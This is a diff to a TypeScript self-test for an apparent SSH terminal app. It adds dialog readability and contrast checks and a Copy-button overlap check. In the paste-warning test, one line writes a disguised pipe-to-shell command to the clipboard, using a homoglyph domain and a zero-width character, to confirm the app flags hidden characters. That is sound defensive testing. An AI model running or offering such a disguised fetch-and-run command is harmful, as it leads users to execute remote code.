@@ -156,6 +156,42 @@ const dress = (t: Tab) => js<Dress>(t.view, `document.fonts.ready.then(() => ({
   face: [...document.fonts].some((f) => f.family.replace(/['"]/g, '') === 'Plex Mono' && f.status === 'loaded'),
   field: (() => { const f = document.querySelector('.xterm-helper-textarea'); return f ? getComputedStyle(f).opacity + ' ' + getComputedStyle(f).position : 'none'; })(),
 }))`);
+// What a person reads in a dialog, measured in the window rather than eyeballed (BUILD-RULES 2.14: at
+// least 14.5px at weight 450, and 4.5:1 or better against its own surface). Kami's #16 was "the font in
+// dialogs is barely readable", and it was true twice over: every sentence was 12px, 12.5px or the body's
+// 13px, and the quiet ones took --text-3, which is 4.30:1 on a dialog. This reads whatever prose is on
+// screen at the moment it is called, so a dialog born small anywhere shows up here.
+const PROSE = '.dlg-lead, .dlg-fact, .gate-lead, .gate-fact, .step-sub, .reach-sub, p.said, .dlg-remove .goes li, #paste .odd li';
+interface Reading { what: string; size: number; weight: number; ratio: number; }
+const prose = (view: WebContentsView) => js<Reading[]>(view, `(() => {
+  const lum = (c) => {
+    const [r, g, b] = c.map((v) => { const s = v / 255; return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4); });
+    return 0.2126 * r + 0.7152 * g + 0.0722 * b;
+  };
+  const rgb = (s) => (s.match(/[\\d.]+/g) || []).slice(0, 3).map(Number);
+  const under = (el) => {
+    for (let n = el; n; n = n.parentElement) {
+      const bg = rgb(getComputedStyle(n).backgroundColor);
+      const a = (getComputedStyle(n).backgroundColor.match(/[\\d.]+/g) || [])[3];
+      if (bg.length === 3 && a !== '0') return bg;
+    }
+    return [0, 0, 0];
+  };
+  return [...document.querySelectorAll(${JSON.stringify(PROSE)})].filter((el) => {
+    const s = getComputedStyle(el);
+    return el.offsetParent !== null && s.visibility !== 'hidden' && (el.textContent || '').trim().length > 12;
+  }).map((el) => {
+    const s = getComputedStyle(el);
+    const a = lum(rgb(s.color)), b = lum(under(el));
+    return {
+      what: (el.id || el.className) + ' "' + (el.textContent || '').trim().slice(0, 28) + '"',
+      size: Math.round(parseFloat(s.fontSize) * 10) / 10,
+      weight: Number(s.fontWeight),
+      ratio: Math.round(((Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05)) * 100) / 100,
+    };
+  });
+})()`);
+const tooSmall = (r: Reading) => r.size < 14.5 || r.weight < 450 || r.ratio < 4.5;
 const dressed = (d: Dress) => d.sheets.length >= 3 && d.sheets.every((n) => n > 0) && d.face && d.field === '0 absolute';
 // A folder that really cannot be written to, on either kind of machine. Permissions do it where there are
 // permissions; on Windows what decides is the folder's own list of who may do what, so the lab writes a deny
@@ -230,6 +266,15 @@ const alive = (pid: number) => {
 export async function runSelfTest(ctx: Ctx): Promise<void> {
   const results: Result[] = [];
   let stage = 'starting';
+  // Every dialog this run opens has its sentences measured as it stands open, and the readings pile up
+  // here; finish() holds them all at once, so one line names whichever dialog is the small one.
+  const readings: Reading[] = [];
+  // The box screens are the mode that opens dialogs: 19 lines across the check, Add box, the first visit, the
+  // settings, a paste, an odd paste, a link, a changed identity, Edit box and Delete box. The floor is just
+  // under that, so the measurement quietly stopping is a failure rather than a pass with nothing in it. The
+  // other modes open no dialogs, and a minimum they cannot meet would fail them for nothing.
+  const wantedReadings = ctx.mode === 'boxes-ui' ? 18 : 0;
+  const read = async (view: WebContentsView): Promise<void> => { readings.push(...(await prose(view))); };
   const check = (name: string, ok: boolean, detail: unknown = '') => {
     stage = `after "${name}"`;
     // What a probe says about a failure is for a person to read, so it is bounded: one probe that happened to
@@ -241,6 +286,12 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
     // Every mode ends here, so every mode is held to this: a page that asked for a file the app does not hold
     // was running without a part of itself.
     check('no page of the app asked for a file the app does not hold', Object.keys(ctx.missing()).length === 0, ctx.missing());
+    // The sentences every dialog of this run put in front of him, each against its own surface. The count is
+    // held too: a measurement that never ran would otherwise pass for a window with no small text in it.
+    const small = readings.filter(tooSmall);
+    check('every sentence a dialog puts in front of him is at least 14.5px at weight 450 and 4.5:1 against its own surface',
+      readings.length >= wantedReadings && small.length === 0,
+      { read: readings.length, wanted: wantedReadings, small });
     const code = asked === 0 && results.every((r) => r.ok) ? 0 : 1;
     process.stdout.write(`SELFTEST ${JSON.stringify({ ok: code === 0, kind: ctx.kind, results })}\n`);
     app.exit(code);
@@ -696,6 +747,24 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         // dim, so from in here the press looked like nothing at all.
         check('Copy says it copied, on the button itself', await until(async () => (await text('#check-copy')).includes('Copied'), 2000), await text('#check-copy'));
         await shot('check-asked', 'the first-connection check, waiting for the paste');
+        await read(ctx.shell);
+        // The block holds the command and the button that copies it. The button used to be lifted out of the
+        // flow and kept clear by a fixed 92px of padding, which is a guess at its width: pressed, it says
+        // "Copied" and is wider than the guess, and it sat across the key in the command. Measured in both
+        // states, because the state that was wrong is the one only a press reaches.
+        const apart = (): Promise<{ over: number; code: number; btn: string }> => js(ctx.shell, `(() => {
+          const c = document.querySelector('.codeblock code'), b = document.getElementById('check-copy');
+          if (!c || !b) return { over: -1, code: -1, btn: 'gone' };
+          const r = c.getBoundingClientRect(), q = b.getBoundingClientRect();
+          return { over: Math.round(Math.min(r.right, q.right) - Math.max(r.left, q.left)), code: Math.round(r.width), btn: (b.textContent || '').trim() };
+        })()`);
+        await clickOn('#check-copy');
+        await until(async () => (await apart()).btn.includes('Copied'), 3000);
+        const noOverlap = await apart();
+        // "Copied" is the wide state and the one the old padding was too small for, so that is the state held
+        // here; the button's own words are held too, so this cannot quietly measure the narrow one instead.
+        check('the button that copies the command does not sit on the command once it says Copied',
+          noOverlap.btn.includes('Copied') && noOverlap.over <= 0 && noOverlap.code > 200, noOverlap);
 
         await clickOn('#check-paste');
         await typeKeys('256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)');
@@ -784,6 +853,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
           const fileFingerprint = (await text('#key-file-key')).split(' ').find((w) => w.startsWith('SHA256:')) ?? '';
           check('a key file with no passphrase opens at once and names its key', shown && fileFingerprint !== '', await text('#key-file-key'));
           await shot('add-key-file', 'Add box, with a key file he already has');
+          await read(ctx.shell);
           await clickOn('#box-name');
           await typeKeys('own-key-box');
           await clickOn('#box-host');
@@ -865,6 +935,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
           const opened = await until(() => has('#first-visit'), 15_000);
           const pinnedFirst = ctx.boxes.list.find((b) => b.id === idA)?.pin !== '';
           await shot('first-visit', 'the one screen that ever asks for a box\'s own password, after the box is pinned', null);
+          await read(ctx.shell);
           check('the first visit opens only from the check, and only with the box already pinned', opened && pinnedFirst && ctx.shellState().firstVisit?.box === idA, [opened, pinnedFirst]);
           // What is typed goes to main and nowhere else: it is not in the window's state, which is what a
           // picture of this screen holds and what every view is told.
@@ -1265,6 +1336,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
             await clickOn('#settings-open');
             const open = await until(() => has('#settings'), 5000);
             await shot('settings', 'the settings: where downloads land, and how big a new tab list starts', null);
+            await read(ctx.shell);
             const showsDefault = await text('#settings-downloads');
             const canPutBack = await js<boolean>(ctx.shell, `document.getElementById('settings-downloads-default')?.disabled === true`);
             check('the settings open from the Boxes menu, show where downloads land now, and offer no way back while that is already the default', open && showsDefault === ctx.downloads && canPutBack, [open, showsDefault === ctx.downloads, canPutBack]);
@@ -2619,6 +2691,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         open1.view.webContents.sendInputEvent({ type: 'keyUp', keyCode: 'V', modifiers: ['control', 'shift'] });
         check('a paste of more than one line is shown before it is sent', await until(() => has('#paste'), 3000), await text('#paste'));
         await shot('paste', 'a paste, read before it is sent');
+        await read(ctx.shell);
         // The same paste with a character that looks like a letter and one drawn as nothing.
         await clickOn('#paste-drop');
 
@@ -2637,6 +2710,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         }
         check('Ctrl+click on an address a box printed asks first', await until(() => has('#link'), 3000), await text('#link'));
         await shot('link', 'an address a box printed, Ctrl+clicked');
+        await read(ctx.shell);
         await clickOn('#link-drop');
         await sleep(300); // two pastes closer together than a person's own hands are refused as a repeat
         clipboard.writeText('curl -fsSL https://exa\u0430mple.test/i\u200bnstall.sh | sh\nsystemctl restart ledger\n');
@@ -2645,6 +2719,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         open1.view.webContents.sendInputEvent({ type: 'keyUp', keyCode: 'V', modifiers: ['control', 'shift'] });
         check('and what cannot be seen in it is named', (await until(() => has('#paste-odd'), 3000)) && (await text('#paste-odd')).includes('looks like a'), await text('#paste-odd'));
         await shot('paste-odd', 'a paste with what cannot be seen in it');
+        await read(ctx.shell);
         await clickOn('#paste-drop');
 
         // Seven tabs on one box in a 1024-wide window: the box's tabs fold into one, and the count opens them.
@@ -2734,6 +2809,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         ctx.openTab(id, '');
         check('a box showing another identity: the tab stops and the dialog says so, with both fingerprints', (await until(() => has('#changed'), 20_000)) && (await text('#changed')).includes(ctx.boxes.list[0]!.pinFingerprint) && (await until(shellOnTop, 1000)), [await has('#changed'), await text('#changed'), shellOnTop(), ctx.shellState().tabs.map((t) => [t.link.phase, t.link.cause]), ctx.shellState().check?.boxId ?? '', ctx.boxes.list.map((b) => [b.name, b.pinFingerprint])]);
         await shot('changed', 'a box whose identity changed');
+        await read(ctx.shell);
         {
           const stopped = [...ctx.tabs.values()].find((x) => x.engine.link.cause === 'identity-changed');
           const pidThen = stopped?.engine.pid;
@@ -2753,6 +2829,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         const editSaid = await text('#add-box');
         check('Edit opens the box as it stands: the same fields, its own values, its key kept and its identity shown', openedEdit && editSaid.includes('Edit lab-box') && editSaid.includes('This box keeps the key Berth made for it') && (await has('#edit-pinned')) && (await text('#edit-pinned')).includes(ctx.boxes.list[0]!.pinFingerprint), [editSaid.slice(0, 120), await text('#edit-pinned')]);
         await shot('edit-box', 'Edit box, with the identity it is pinned to');
+        await read(ctx.shell);
         // The name is changed to one already taken: refused by name, and nothing is saved.
         const nameField = '#box-name';
         const pickAll = async (sel: string) => js(ctx.shell, `(() => { const i = document.querySelector(${JSON.stringify(sel)}); if (!i) return 'no field'; i.focus(); i.setSelectionRange(0, i.value.length); return 'ok'; })()`);
@@ -2802,6 +2879,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
         check('and it says what stays on the box itself', (await text('#remove-stays')).includes('only the box can take it out'), await text('#remove-stays'));
         check('the way out has the focus, so Enter keeps the box', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'remove-cancel', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
         await shot('remove-box', 'Delete box: what goes with it');
+        await read(ctx.shell);
         await clickOn('#remove-cancel');
         check('Keep it: the box, its key and its tabs are all still there', (await until(async () => !(await has('#remove-box')), 2000)) && ctx.boxes.list.some((b) => b.id === id) && [...ctx.tabs.values()].some((t) => t.box?.id === id), '');
         // And deleted for real: the box, its key and its tabs go together.
